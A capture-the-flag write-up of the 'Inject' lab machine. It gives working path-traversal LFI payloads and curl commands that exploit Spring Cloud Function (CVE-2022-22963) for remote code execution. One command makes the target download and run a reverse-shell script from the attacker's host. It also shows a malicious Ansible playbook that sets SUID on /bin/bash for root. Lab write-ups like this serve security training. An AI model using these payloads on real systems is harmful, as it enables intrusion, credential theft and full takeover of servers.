## Enumeration :

I started with a quick rustscan and found two open ports: 22 and 8080.

```
sudo rustscan -a 10.10.11.204 -- -sC -sV -T4 -vv -oN inject_nmap
```

Upon checking the website running on port 8080, I discovered that it provides cloud and file-sharing services:

By going to the '/blogs' section, I found three blogs written by two users: "admin" and "Brandon Auger":

![image](https://user-images.githubusercontent.com/87700008/224534657-01d2e78c-10d3-4e3c-987b-888afa023021.png)

Moving further, I checked the HTML source code of the page, but I didn't find anything special. So, I moved on to directory listing and subdomain enumeration.

During subdomain or VHOST enumeration, I didn't find anything:

![image](https://user-images.githubusercontent.com/87700008/224540315-9024f38b-f8a5-4641-8cad-c6d61dccf4da.png)

However, in the directory list, I found some directories :

![image](https://user-images.githubusercontent.com/87700008/224540364-b533d963-7d2f-4667-a516-20b71d806188.png)

I checked 'release_notes,' but on this page, there were only release notifications :

![image](https://user-images.githubusercontent.com/87700008/224542030-b05e0ee7-d985-42e5-aad6-c3ae5723ffb2.png)

I attempted to register on the page, but it was under construction :

Next, I went to the '/uploads' section, and after uploading the PHP reverse shell, I observed that I could only upload image files. So, I uploaded a file with a '.jpg' extension and found that it led me to another page where I could see my uploaded image.

      /show_image?img=php-reverse-shell.php.jpg
      
 ![image](https://user-images.githubusercontent.com/87700008/224542405-281c94f6-e0d0-4a33-91df-510489a706b9.png)

I tested the '/show_image?img=' path with some LFI payloads and started checking with '/etc/passwd.' After trying multiple payloads, I entered the below payload and observed a 200 response.

    &.//&.//&.//&.//&.//etc/group
    
![image](https://user-images.githubusercontent.com/87700008/224542604-ab7a9e08-3a79-4bba-82f9-3e363a24ec51.png)

I confirmed here that this path is vulnerable to LFI, but I still couldn't read the /etc/passwd content, so I tried some more LFI payloads. 
After some time, I had success with this payload :

    ../../../../../../../../../../../../../../../../etc/passwd
    
![image](https://user-images.githubusercontent.com/87700008/224542688-f6d088b2-33e1-49dd-b149-684d6b969433.png)

I found two users in the above list": "I found two users in the above list, 'frank' and 'phil'.

With further enumeration I found below results :

Going further into the below-mentioned directory, I found an XML config file :

    ../../../../../../../../../../../../../../../../var/www/WebApp/pom.xml
    
In this config file, I found a framework running with 'Spring cloud function,' which is vulnerable to RCE, as found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk

I discovered a vulnerability in the spring framework module, and found an [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.

To test whether I could create a file in the 'tmp' directory, I executed the following curl command:

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/expl0it")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

![image](https://user-images.githubusercontent.com/87700008/224731422-f9dbf038-60a4-476b-b74c-3830b819a528.png)

After running the command, I checked the 'tmp' directory and found that the 'expl0it' folder had been successfully created. With the directory in place, I was able to proceed to the next step of the attack.

### Initial access:

To establish a reverse shell, I created a bash file with the following code, which would receive the reverse shell in my machine:

![image](https://user-images.githubusercontent.com/87700008/224747729-b9ba917c-4be2-49e6-b1ce-4af09fcfc977.png)

Next, I started a Python 3 HTTP server and uploaded the bash file using the following command:

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.103/hell.sh -o /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
    
Then, I executed the uploaded bash script using the following command and successfully obtained a reverse shell: (pwn3d!ðŸ™‚)

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

While exploring Frank's home directory, I found a folder named ".m2". Curious, I took a look inside and found a "settings.xml" file that contained Phil's password:

![image](https://user-images.githubusercontent.com/87700008/224754633-7fbf629c-c60e-4624-b4de-e78adebc97b2.png)

![image](https://user-images.githubusercontent.com/87700008/224754874-d31ef599-37f2-4f96-96d3-7328ab8e31c0.png)

I tried to log in to Phil's account via SSH using the gathered credentials, but was unsuccessful. ðŸ˜•
However, I then tried switching directly to user "phil" using the same password, and this time I was successful. (pwn3d! ðŸ™‚)

Now that I had access to Phil's account, I retrieved the user flag:

![image](https://user-images.githubusercontent.com/87700008/224756415-b5283543-5190-4b6a-a2b2-32ceafecdc22.png)

## Privilege Escalation: :

I attempted to use the 'linpeas' script for privilege escalation, but it didn't provide any useful information. I also tried manual enumeration but had no luck there either.

Next, I uploaded the pspy binary to the Inject box and started checking the root processes. I discovered a process called 'ansible-playbook' running with root privileges:

![image](https://user-images.githubusercontent.com/87700008/224776993-8622cded-e74f-4fdf-ad86-c7b1a865c672.png)

I found an exploit for 'ansible-playbook' on [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'

This tool automates all "*yml" files in the /task directory, where the playbook_1.yml file is located. The file is a fragment of an Ansible playbook file, which is a YAML file containing a series of tasks that Ansible must execute on a set of hosts or on a specific host.

Upon checking the "/opt/automation/tasks" directory, I discovered that, in addition to "root," the "staff" user also has access to write to the task directory, and Phil is a member of the Staff user group:

![image](https://user-images.githubusercontent.com/87700008/224779114-b591dbc0-aae4-4700-99c1-399409b77c57.png)

Therefore, I created a file named 'pe.yml' inside the task directory with the following code:

```
- hosts:  localhost
  tasks:
    - name: become root
      command: chmod u+s /bin/bash
      become: true
```

As long as a file with an extension ending in '.yml' is present in the 'task' directory, 'ansible-playbook' will execute it. After waiting for nearly a minute, I ran 'bash -p' and successfully gained root access (pwn3d!ðŸ™‚).
